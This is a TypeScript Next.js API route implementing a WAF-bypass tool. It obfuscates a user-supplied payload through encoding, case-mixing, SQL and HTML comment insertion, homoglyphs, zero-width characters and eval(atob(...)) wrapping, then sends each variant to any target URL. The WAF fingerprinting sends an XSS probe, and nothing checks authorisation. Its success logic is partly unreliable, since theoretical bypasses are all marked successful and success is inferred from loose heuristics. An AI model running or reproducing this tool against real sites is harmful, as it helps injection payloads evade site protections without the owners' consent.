import { NextRequest, NextResponse } from 'next/server';

interface WAFBypassRequest {
  payload: string;
  targetUrl?: string;
  bypassType: 'comprehensive' | 'encoding' | 'obfuscation' | 'case-manipulation' | 'comment-insertion' | 'unicode';
  wafType: string;
}

interface WAFBypassResult {
  bypassesFound: number;
  totalTechniques: number;
  successfulPayloads: string[];
  bypassTechniques: string[];
  detectedWAF: string;
  riskLevel: 'Low' | 'Medium' | 'High' | 'Critical';
  recommendations: string[];
  detailedResults: {
    technique: string;
    payload: string;
    originalPayload: string;
    success: boolean;
    method: string;
  }[];
}

export async function POST(request: NextRequest) {
  try {
    const body: WAFBypassRequest = await request.json();
    const { payload, targetUrl, bypassType, wafType } = body;

    if (!payload) {
      return NextResponse.json(
        { error: 'Payload is required' },
        { status: 400 }
      );
    }

    // Test real WAF bypass techniques
    const results: WAFBypassResult = await testRealWAFBypasses(
      payload,
      bypassType,
      wafType,
      targetUrl
    );

    return NextResponse.json(results);
  } catch (error) {
    console.error('WAF bypass error:', error);
    return NextResponse.json(
      { error: 'Failed to generate WAF bypasses' },
      { status: 500 }
    );
  }
}

async function testRealWAFBypasses(
  originalPayload: string,
  bypassType: string,
  wafType: string,
  targetUrl?: string
): Promise<WAFBypassResult> {
  const bypassTechniques = {
    encoding: [
      { name: 'URL Encoding', method: 'URL' },
      { name: 'Double URL Encoding', method: 'URL' },
      { name: 'HTML Entity Encoding', method: 'HTML' },
      { name: 'Unicode Encoding', method: 'Unicode' },
      { name: 'Hex Encoding', method: 'Hex' },
      { name: 'Base64 Encoding', method: 'Base64' },
    ],
    obfuscation: [
      { name: 'String Concatenation', method: 'Concat' },
      { name: 'Variable Assignment', method: 'Variable' },
      { name: 'Function Wrapping', method: 'Function' },
      { name: 'Character Code Conversion', method: 'CharCode' },
      { name: 'Template Literals', method: 'Template' },
    ],
    'case-manipulation': [
      { name: 'Mixed Case', method: 'Case' },
      { name: 'Alternating Case', method: 'Case' },
      { name: 'Random Case', method: 'Case' },
      { name: 'Uppercase Keywords', method: 'Case' },
    ],
    'comment-insertion': [
      { name: 'SQL Comments', method: 'Comment' },
      { name: 'HTML Comments', method: 'Comment' },
      { name: 'JavaScript Comments', method: 'Comment' },
      { name: 'Inline Comments', method: 'Comment' },
    ],
    unicode: [
      { name: 'Unicode Normalization', method: 'Unicode' },
      { name: 'Unicode Homoglyphs', method: 'Unicode' },
      { name: 'Zero-Width Characters', method: 'Unicode' },
      { name: 'Surrogate Pairs', method: 'Unicode' },
    ],
  };

  let techniques: Array<{ name: string; method: string }> = [];

  if (bypassType === 'comprehensive') {
    techniques = [
      ...bypassTechniques.encoding,
      ...bypassTechniques.obfuscation,
      ...bypassTechniques['case-manipulation'],
      ...bypassTechniques['comment-insertion'],
      ...bypassTechniques.unicode,
    ];
  } else if (bypassTechniques[bypassType as keyof typeof bypassTechniques]) {
    techniques = bypassTechniques[bypassType as keyof typeof bypassTechniques];
  }

  const detailedResults = [];
  const detectedWAF = await detectRealWAF(targetUrl);
  
  // If no target URL provided, generate theoretical bypasses
  if (!targetUrl) {
    for (const technique of techniques) {
      const bypassedPayload = applyBypassTechnique(originalPayload, technique.name);
      detailedResults.push({
        technique: technique.name,
        payload: bypassedPayload,
        originalPayload,
        success: true, // Assume success for theoretical bypasses
        method: technique.method,
      });
    }
  } else {
    // Test actual bypasses against target URL
    const baselineResponse = await testOriginalPayload(targetUrl, originalPayload);
    
    for (const technique of techniques) {
      try {
        const bypassedPayload = applyBypassTechnique(originalPayload, technique.name);
        const success = await testBypassPayload(targetUrl, bypassedPayload, baselineResponse);
        
        detailedResults.push({
          technique: technique.name,
          payload: bypassedPayload,
          originalPayload,
          success,
          method: technique.method,
        });
        
        // Add delay between requests
        await new Promise(resolve => setTimeout(resolve, 300));
      } catch (error) {
        detailedResults.push({
          technique: technique.name,
          payload: applyBypassTechnique(originalPayload, technique.name),
          originalPayload,
          success: false,
          method: technique.method,
        });
      }
    }
  }

  const successfulResults = detailedResults.filter(result => result.success);
  const successfulPayloads = successfulResults.map(result => result.payload);
  const bypassTechniqueNames = [...new Set(successfulResults.map(result => result.technique))];

  const riskLevel = calculateRiskLevel(successfulResults.length, techniques.length);
  const recommendations = generateRecommendations(successfulResults.length > 0, detectedWAF);

  return {
    bypassesFound: successfulResults.length,
    totalTechniques: techniques.length,
    successfulPayloads,
    bypassTechniques: bypassTechniqueNames,
    detectedWAF,
    riskLevel,
    recommendations,
    detailedResults,
  };
}

async function detectRealWAF(targetUrl?: string): Promise<string> {
  if (!targetUrl) {
    return 'No target URL provided';
  }
  
  try {
    const response = await fetch(targetUrl, {
      method: 'GET',
      headers: {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
      },
      signal: AbortSignal.timeout(10000),
    });
    
    const headers = response.headers;
    
    // Check for WAF-specific headers
    if (headers.get('cf-ray')) return 'Cloudflare';
    if (headers.get('x-sucuri-id')) return 'Sucuri CloudProxy';
    if (headers.get('x-powered-by-plesk')) return 'Plesk';
    if (headers.get('server')?.includes('cloudflare')) return 'Cloudflare';
    if (headers.get('server')?.includes('AkamaiGHost')) return 'Akamai';
    if (headers.get('x-cdn')?.includes('Incapsula')) return 'Imperva Incapsula';
    if (headers.get('x-iinfo')) return 'Imperva Incapsula';
    if (headers.get('server')?.includes('nginx')) return 'Nginx (Possible ModSecurity)';
    if (headers.get('server')?.includes('Apache')) return 'Apache (Possible ModSecurity)';
    
    // Test with a simple malicious payload to trigger WAF response
    const testResponse = await fetch(`${targetUrl}?test=<script>alert('xss')</script>`, {
      method: 'GET',
      headers: {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
      },
      signal: AbortSignal.timeout(10000),
    });
    
    const responseText = await testResponse.text();
    
    // Check response for WAF signatures
    if (responseText.includes('Cloudflare')) return 'Cloudflare';
    if (responseText.includes('Request blocked')) return 'Generic WAF';
    if (responseText.includes('ModSecurity')) return 'ModSecurity';
    if (responseText.includes('AWS WAF')) return 'AWS WAF';
    if (responseText.includes('Access Denied')) return 'Generic WAF';
    
    return 'No WAF detected or Unknown WAF';
    
  } catch (error) {
    return 'Error detecting WAF';
  }
}

async function testOriginalPayload(targetUrl: string, payload: string): Promise<{
  statusCode: number;
  blocked: boolean;
  responseText: string;
}> {
  try {
    const testUrl = `${targetUrl}${targetUrl.includes('?') ? '&' : '?'}test=${encodeURIComponent(payload)}`;
    const response = await fetch(testUrl, {
      method: 'GET',
      headers: {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
      },
      signal: AbortSignal.timeout(10000),
    });
    
    const responseText = await response.text();
    const blocked = isResponseBlocked(response.status, responseText);
    
    return {
      statusCode: response.status,
      blocked,
      responseText,
    };
  } catch (error) {
    return {
      statusCode: 0,
      blocked: true,
      responseText: 'Request failed',
    };
  }
}

async function testBypassPayload(
  targetUrl: string, 
  bypassPayload: string, 
  baseline: any
): Promise<boolean> {
  try {
    const testUrl = `${targetUrl}${targetUrl.includes('?') ? '&' : '?'}test=${encodeURIComponent(bypassPayload)}`;
    const response = await fetch(testUrl, {
      method: 'GET',
      headers: {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
      },
      signal: AbortSignal.timeout(10000),
    });
    
    const responseText = await response.text();
    const blocked = isResponseBlocked(response.status, responseText);
    
    // If baseline was blocked but this payload is not blocked, it's a successful bypass
    if (baseline.blocked && !blocked) {
      return true;
    }
    
    // If status codes differ significantly, might indicate different treatment
    if (Math.abs(response.status - baseline.statusCode) > 100) {
      return response.status < baseline.statusCode; // Lower status code might indicate success
    }
    
    // Check if payload is reflected in response (indicating it passed through WAF)
    if (responseText.includes(bypassPayload.substring(0, 10))) {
      return true;
    }
    
    return false;
  } catch (error) {
    return false;
  }
}

function isResponseBlocked(statusCode: number, responseText: string): boolean {
  // Check for common WAF block status codes
  if ([403, 406, 418, 429, 451, 503].includes(statusCode)) {
    return true;
  }
  
  // Check for common WAF block messages
  const blockMessages = [
    'access denied',
    'request blocked',
    'forbidden',
    'security violation',
    'modsecurity',
    'cloudflare',
    'waf',
    'blocked by',
    'suspicious activity',
    'malicious request',
  ];
  
  const lowerResponseText = responseText.toLowerCase();
  return blockMessages.some(message => lowerResponseText.includes(message));
}

function applyBypassTechnique(payload: string, technique: string): string {
  switch (technique) {
    case 'URL Encoding':
      return encodeURIComponent(payload);
    
    case 'Double URL Encoding':
      return encodeURIComponent(encodeURIComponent(payload));
    
    case 'HTML Entity Encoding':
      return payload.replace(/[<>'"&]/g, char => `&#${char.charCodeAt(0)};`);
    
    case 'Unicode Encoding':
      return payload.split('').map(char => `\\u${char.charCodeAt(0).toString(16).padStart(4, '0')}`).join('');
    
    case 'Hex Encoding':
      return payload.split('').map(char => `%${char.charCodeAt(0).toString(16)}`).join('');
    
    case 'Mixed Case':
      return payload.split('').map((char, index) => 
        index % 2 === 0 ? char.toLowerCase() : char.toUpperCase()
      ).join('');
    
    case 'SQL Comments':
      if (payload.includes('SELECT')) {
        return payload.replace(/SELECT/gi, 'SEL/**/ECT').replace(/UNION/gi, 'UNI/**/ON');
      }
      return payload.replace(/script/gi, 'scr/**/ipt');
    
    case 'HTML Comments':
      return payload.replace(/script/gi, 'scr<!---->ipt');
    
    case 'String Concatenation':
      if (payload.includes('alert')) {
        return payload.replace(/alert/g, "'ale'+'rt'");
      }
      return payload.replace(/script/g, "'scr'+'ipt'");
    
    case 'Character Code Conversion':
      return payload.replace(/alert/g, 'String.fromCharCode(97,108,101,114,116)');
    
    case 'Template Literals':
      return payload.replace(/alert/g, '`alert`');
    
    case 'Function Wrapping':
      return `eval(atob('${btoa(payload)}'))`;
    
    case 'Unicode Homoglyphs':
      return payload.replace(/a/g, 'а').replace(/o/g, 'о'); // Cyrillic lookalikes
    
    case 'Zero-Width Characters':
      return payload.split('').join('\u200B'); // Zero-width space
    
    default:
      return payload;
  }
}

function getWAFTypeFromUser(wafType: string): string {
  const wafNames: { [key: string]: string } = {
    'cloudflare': 'Cloudflare',
    'aws-waf': 'AWS WAF',
    'mod-security': 'ModSecurity',
    'imperva': 'Imperva SecureSphere',
    'akamai': 'Akamai Kona',
    'generic': 'Generic WAF'
  };
  
  return wafNames[wafType] || 'Unknown WAF';
}

function calculateRiskLevel(
  successfulBypasses: number,
  totalTechniques: number
): 'Low' | 'Medium' | 'High' | 'Critical' {
  const successRate = successfulBypasses / totalTechniques;
  
  if (successRate >= 0.7) return 'Critical';
  if (successRate >= 0.5) return 'High';
  if (successRate >= 0.3) return 'Medium';
  return 'Low';
}

function generateRecommendations(
  bypassesFound: boolean,
  wafType: string
): string[] {
  const baseRecommendations = [
    "🔒 Implement defense-in-depth security strategy",
    "🛡️ Regular WAF rule updates and tuning",
    "📊 Enable comprehensive logging and monitoring",
    "🔍 Implement application-level input validation",
    "⚡ Deploy multiple security layers (WAF + IPS + endpoint protection)",
  ];

  if (!bypassesFound) {
    return [
      "✅ WAF configuration appears robust against tested bypass techniques",
      ...baseRecommendations,
      "🔄 Continue regular penetration testing to maintain security posture",
    ];
  }

  const criticalRecommendations = [
    "🚨 Critical: Multiple bypass techniques successful - immediate WAF review required",
    "🔧 Update WAF rules to address identified bypass methods",
    "📋 Implement custom rules for application-specific attack patterns",
    "🎯 Consider behavioral analysis and machine learning-based detection",
  ];

  const wafSpecificRecommendations: { [key: string]: string[] } = {
    'Cloudflare': [
      "⚙️ Enable Cloudflare's Advanced DDoS Protection",
      "🔒 Configure custom firewall rules for your application",
      "📊 Review Cloudflare Security Analytics for attack patterns",
    ],
    'AWS WAF': [
      "⚙️ Implement AWS WAF v2 with improved rule capabilities",
      "🔒 Use AWS Managed Rules for common attack patterns",
      "📊 Enable AWS WAF logging to CloudWatch for analysis",
    ],
    'ModSecurity': [
      "⚙️ Update to latest OWASP Core Rule Set (CRS)",
      "🔒 Fine-tune rules to reduce false positives",
      "📊 Implement proper logging and alerting mechanisms",
    ],
  };

  return [
    ...criticalRecommendations,
    ...baseRecommendations,
    ...(wafSpecificRecommendations[wafType] || []),
  ];
}
